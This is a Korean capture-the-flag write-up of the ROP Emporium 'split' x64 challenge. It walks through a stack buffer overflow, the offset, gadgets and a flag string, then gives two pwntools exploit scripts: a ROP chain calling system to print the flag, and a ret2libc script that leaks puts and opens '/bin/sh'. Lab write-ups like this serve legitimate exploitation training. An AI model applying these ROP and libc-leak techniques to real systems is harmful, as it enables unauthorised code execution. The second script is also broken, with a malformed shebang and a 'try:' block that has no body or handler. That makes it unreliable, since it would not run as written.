Emporium split(x64) 라이트업
=========================


## 1.  IDA

### main
<img width="652" height="182" alt="image" src="https://github.com/user-attachments/assets/c2aadb86-0cf6-430e-ad63-5b9fa70917d6" />

### pwnme 함수
<img width="557" height="217" alt="image" src="https://github.com/user-attachments/assets/e3c55b7d-7fce-44f4-91a1-8f32a9affa9e" />

<img width="806" height="598" alt="image" src="https://github.com/user-attachments/assets/df27fb73-e58d-46b1-b539-54f5020e8b6c" />


### usefulFunction

<img width="312" height="108" alt="image" src="https://github.com/user-attachments/assets/39c44657-43b4-464e-8b47-f02857480221" />

* pwnme의 read(0, rbp-0x20, 0x60)에서 버퍼 오버플로우 발생
* 코드의 흐름을 usefulFuction으로 실행해 system의 인자로 /bin/cat flag.txt를 넘겨줘서 플래그를 얻어내야 한다고 짐작할 수 있다.


## 2. 익스플로잇

### ret까지의 거리 구하기
 

<img width="307" height="102" alt="image" src="https://github.com/user-attachments/assets/538f6e05-522b-4912-9d84-738d578baa46" />

pwnme의 시작 부분과 read함수 호출부분에 브레이크포인트룰 걸고 pwndbg를 실행한다. 

<img width="612" height="107" alt="image" src="https://github.com/user-attachments/assets/e5e4528f-ee09-4368-8a0d-222e9a1eaed6" />

<img width="632" height="106" alt="image" src="https://github.com/user-attachments/assets/c546b276-1807-4e71-8731-2c066b8e55cc" />

따라서 offset은 40이고 40개 이상의 문자를 입력해야 ret이 변조된다. 


### pop rdi  가젯 구하기

<img width="1250" height="72" alt="image" src="https://github.com/user-attachments/assets/78556130-06af-4950-b49b-0df1bff4e2b3" />

<img width="1366" height="131" alt="image" src="https://github.com/user-attachments/assets/74b6d670-5df0-4c75-91d0-c484678e464e" />

ret 가젯도 찾아둔다.

### "/bin/cat flag.txt" 구하기

<img width="1033" height="131" alt="image" src="https://github.com/user-attachments/assets/46cb98b3-0962-44ad-b517-1ee1aac80e15" />


### 익스플로잇 코드


```python
from pwn import *

r = process('./split')
e = ELF('./split')

pop_rdi_ret = 0x4007c3
cat_flag = 0x601060

read_got = e.got['read']
read_plt = e.plt['read']
print('read@got : ' + str(hex(read_got)))
print('read@plt : ' + str(hex(read_plt)))

usefulFunction = e.symbols['usefulFunction']
system = e.symbols['system']
print('usefulFunction : ' + str(hex(usefulFunction)))
print('system : ' + str(hex(system)))

payload = ("A"*40).encode()

payload += p64(pop_rdi_ret)
payload += p64(cat_flag)
payload += p64(system)

r.send(payload)

r.interactive()
```

libc 파일 가져와서 쓰는 방법으로는


```
#!/bin"python3
from pwn import *

# 1. 기본 설정
e = ELF('./split')
p = process(e.path)
libc = ELF('./libc6.so') 

pop_rdi_ret = 0x004007c3
main_addr = e.symbols['main'] 
ret_gadget = 0x0040053e 


payload = b'A' * 40           
payload += p64(pop_rdi_ret)    
payload += p64(e.got['puts'])   
payload += p64(e.plt['puts'])   
payload += p64(main_addr)       

p.recvuntil(b'> ')
p.sendline(payload)


try:
    p.recvuntil(b'Thank you!\n')



leaked_data = p.recv(6) 
leaked_puts = u64(leaked_data.ljust(8, b'\x00'))
log.success(f"Leaked 'puts' address: {hex(leaked_puts)}")

libc_base = leaked_puts - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

log.info(f"Libc base address: {hex(libc_base)}")
log.info(f"Calculated 'system' address: {hex(system_addr)}")
log.info(f"Calculated '/bin/sh' address: {hex(bin_sh_addr)}")


payload2 = b'A' * 40
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh_addr)
payload2 += p64(ret_gadget)     
payload2 += p64(system_addr)

p.recvuntil(b'> ')
p.sendline(payload2)

p.interactive()
```


<img width="557" height="58" alt="image" src="https://github.com/user-attachments/assets/d65d033f-d9c6-4422-a484-b55c217aae89" />


